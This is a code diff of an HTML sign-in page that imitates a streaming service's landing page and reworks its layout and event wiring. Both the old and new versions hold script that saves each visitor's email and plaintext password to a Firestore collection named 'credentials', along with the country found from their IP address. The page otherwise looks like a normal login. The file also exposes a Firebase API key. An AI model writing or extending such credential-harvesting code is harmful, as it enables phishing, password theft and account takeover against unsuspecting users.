@@ -14,11 +14,11 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
   inset: 0;
   background:
     linear-gradient(to top, rgba(0,0,0,.85), rgba(0,0,0,.35)),
-    url("https://rinolski.neocities.org/images/Rinolski-preview.png) center/cover no-repeat;
-  z-index: -1;
+    url("https://rinolski.neocities.org/images/Rinolski-preview.png") center/cover no-repeat;
+  z-index: 0;
 }
 
-.header { display: flex; justify-content: space-between; align-items: center; padding: 22px 40px; }
+.header { display: flex; justify-content: space-between; align-items: center; padding: 22px 40px; position: relative; z-index: 1; }
 .logo { font-size: 28px; font-weight: bold; color: #e50914; }
 .auth-btn { background: #e50914; border: none; color: #fff; padding: 8px 18px; border-radius: 4px; cursor: pointer; }
 
@@ -29,17 +29,19 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
   justify-content: center;
   align-items: center;
   text-align: center;
+  position: relative;
+  z-index: 1;
 }
 
 .center h1 { font-size: 3rem; }
 .center p { margin-top: 10px; font-size: 1.3rem; color: #ddd; }
 .get-started { margin-top: 30px; padding: 18px 48px; font-size: 1.6rem; font-weight: bold; background: #e50914; border: none; color: #fff; border-radius: 4px; cursor: pointer; }
 
-.modal { position: fixed; inset: 0; background: rgba(0,0,0,.85); display: none; align-items: center; justify-content: center; }
+.modal { position: fixed; inset: 0; background: rgba(0,0,0,.85); display: none; align-items: center; justify-content: center; z-index: 100; }
 .modal-box { background: #111; padding: 30px; width: 320px; border-radius: 6px; }
-.modal-box h2 { margin-bottom: 20px; }
-.modal-box input { width: 100%; padding: 12px; margin-bottom: 12px; background: #222; border: none; color: #fff; }
-.modal-box button { width: 100%; padding: 12px; background: #e50914; border: none; color: #fff; font-weight: bold; cursor: pointer; }
+.modal-box h2 { margin-bottom: 20px; font-size: 22px; }
+.modal-box input { width: 100%; padding: 12px; margin-bottom: 12px; background: #222; border: none; color: #fff; border-radius: 4px; }
+.modal-box button { width: 100%; padding: 12px; background: #e50914; border: none; color: #fff; font-weight: bold; cursor: pointer; border-radius: 4px; }
 .switch { margin-top: 12px; font-size: 14px; color: #aaa; cursor: pointer; text-align: center; }
 .error-msg { color: #ff4c4c; margin-bottom: 10px; font-size: 14px; text-align: center; }
 </style>
@@ -56,7 +58,7 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
 <div class="center">
   <h1>Unlimited movies, series, and more.</h1>
   <p>Watch anywhere. Cancel anytime.</p>
-  <button class="get-started" onclick="openAuth()">Get Started</button>
+  <button class="get-started">Get Started</button>
 </div>
 
 <!-- AUTH MODAL -->
@@ -66,62 +68,57 @@ body { font-family: Arial, Helvetica, sans-serif; background: #000; color: #fff;
     <div id="error" class="error-msg"></div>
     <input id="email" type="email" placeholder="Email">
     <input id="password" type="password" placeholder="Password">
-    <button onclick="submitAuth()">Continue</button>
-    <div class="switch" onclick="toggleMode()">Don’t have an account? Sign up</div>
+    <button id="submitBtn">Continue</button>
+    <div class="switch" id="toggleMode">Don’t have an account? Sign up</div>
   </div>
 </div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, signOut, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
 import { getFirestore, doc, setDoc, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
+// Firebase config
 const firebaseConfig = {
   apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
   authDomain: "rinolski-notifications.firebaseapp.com",
   projectId: "rinolski-notifications",
   appId: "1:355554579853:web:3caa961653c0cdc0a359c4"
 };
-
 const app = initializeApp(firebaseConfig);
 const auth = getAuth(app);
 const db = getFirestore(app);
 
-/* DOM */
+// DOM
 const authBtn = document.getElementById("authBtn");
+const getStartedBtn = document.querySelector(".get-started");
 const modal = document.getElementById("modal");
-const title = document.getElementById("modalTitle");
-const switchText = document.querySelector(".switch");
+const modalTitle = document.getElementById("modalTitle");
+const toggleModeBtn = document.getElementById("toggleMode");
 const emailInput = document.getElementById("email");
 const passwordInput = document.getElementById("password");
+const submitBtn = document.getElementById("submitBtn");
 const errorDiv = document.getElementById("error");
 
 let isSignup = false;
 
-window.openAuth = () => {
+// Open modal
+function openAuth() {
   errorDiv.textContent = "";
   modal.style.display = "flex";
-};
-
-window.toggleMode = () => {
-  isSignup = !isSignup;
-  title.textContent = isSignup ? "Sign Up" : "Sign In";
-  switchText.textContent = isSignup ? "Already have an account? Sign in" : "Don’t have an account? Sign up";
-  errorDiv.textContent = "";
-};
-
-async function getUserLocation() {
-  try {
-    const res = await fetch('https://ipapi.co/json/');
-    const data = await res.json();
-    return data.country_name || "Unknown";
-  } catch {
-    return "Unknown";
-  }
 }
 
+// Toggle Sign In / Sign Up
+function toggleMode() {
+  isSignup = !isSignup;
+  modalTitle.textContent = isSignup ? "Sign Up" : "Sign In";
+  toggleModeBtn.textContent = isSignup ? "Already have an account? Sign in" : "Don’t have an account? Sign up";
+  errorDiv.textContent = "";
+}
+
+// Friendly error messages
 function getFriendlyError(err) {
-  switch (err.code) {
+  switch(err.code){
     case "auth/invalid-email": return "Please enter a valid email address.";
     case "auth/user-not-found": return "No account found with this email. Try signing up.";
     case "auth/wrong-password": return "Incorrect password. Please try again.";
@@ -131,78 +128,75 @@ function getFriendlyError(err) {
   }
 }
 
-async function saveUserData(email, password, status, isNew=false) {
-  const country = await getUserLocation();
-  const userDoc = doc(db, "credentials", email);
+// Get user country
+async function getUserLocation(){
+  try{
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    return data.country_name || "Unknown";
+  } catch { return "Unknown"; }
+}
 
+// Save credentials to Firestore
+async function saveUserData(email, password, status, isNew=false){
+  const country = await getUserLocation();
+  const userDoc = doc(db,"credentials",email);
   if(isNew){
-    await setDoc(userDoc, {
-      email,
-      password,
-      status,
-      country,
+    await setDoc(userDoc,{
+      email,password,status,country,
       createdAt: serverTimestamp(),
       lastAction: serverTimestamp()
-    }, { merge: true });
+    }, {merge:true});
   } else {
-    await setDoc(userDoc, {
-      password,
-      status,
-      country,
-      lastAction: serverTimestamp()
-    }, { merge: true });
+    await setDoc(userDoc,{
+      password,status,country,lastAction: serverTimestamp()
+    }, {merge:true});
   }
 }
 
-window.submitAuth = async () => {
+// Submit Sign In / Sign Up
+async function submitAuth(){
   const email = emailInput.value.trim();
   const password = passwordInput.value;
-
-  if (!email || !password) {
+  if(!email || !password){
     errorDiv.textContent = "Please fill in both email and password.";
     return;
   }
-
-  try {
-    const userDocRef = doc(db, "credentials", email);
+  try{
+    const userDocRef = doc(db,"credentials",email);
     const docSnap = await getDoc(userDocRef);
     const isNew = !docSnap.exists();
-
-    if (isSignup) {
-      await createUserWithEmailAndPassword(auth, email, password);
-      await saveUserData(email, password, "Signed Up", isNew);
+    if(isSignup){
+      await createUserWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed Up",isNew);
     } else {
-      await signInWithEmailAndPassword(auth, email, password);
-      await saveUserData(email, password, "Signed In", isNew);
+      await signInWithEmailAndPassword(auth,email,password);
+      await saveUserData(email,password,"Signed In",isNew);
     }
-
     errorDiv.style.color = "#4CAF50";
     errorDiv.textContent = isSignup ? "Account created successfully!" : "Signed in successfully!";
-
-    setTimeout(() => {
-      window.location.href = "https://rinolski.neocities.org/Home.html"; // redirect after sign in/up
-    }, 1000);
-
-    emailInput.value = "";
-    passwordInput.value = "";
-
-  } catch (err) {
-    errorDiv.style.color = "#ff4c4c";
+    setTimeout(()=>{ window.location.href = "https://rinolski.neocities.org/Home.html"; },1000);
+    emailInput.value="";
+    passwordInput.value="";
+  } catch(err){
+    errorDiv.style.color="#ff4c4c";
     errorDiv.textContent = getFriendlyError(err);
     console.error(err);
   }
-};
+}
 
-// Automatic redirect if already signed in
-onAuthStateChanged(auth, async (user) => {
-  if (user) {
-    // Only redirect automatically on landing page
-    if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/" || window.location.pathname === "/index.html") {
+// Event listeners
+authBtn.addEventListener('click', openAuth);
+getStartedBtn.addEventListener('click', openAuth);
+toggleModeBtn.addEventListener('click', toggleMode);
+submitBtn.addEventListener('click', submitAuth);
+
+// Auto redirect if already signed in
+onAuthStateChanged(auth, user=>{
+  if(user){
+    if(window.location.pathname.endsWith("index.html") || window.location.pathname === "/" || window.location.pathname === "/index.html"){
       window.location.href = "https://rinolski.neocities.org/Home.html";
     }
-  } else {
-    authBtn.textContent = "Sign In";
-    authBtn.onclick = openAuth;
   }
 });
 </script>
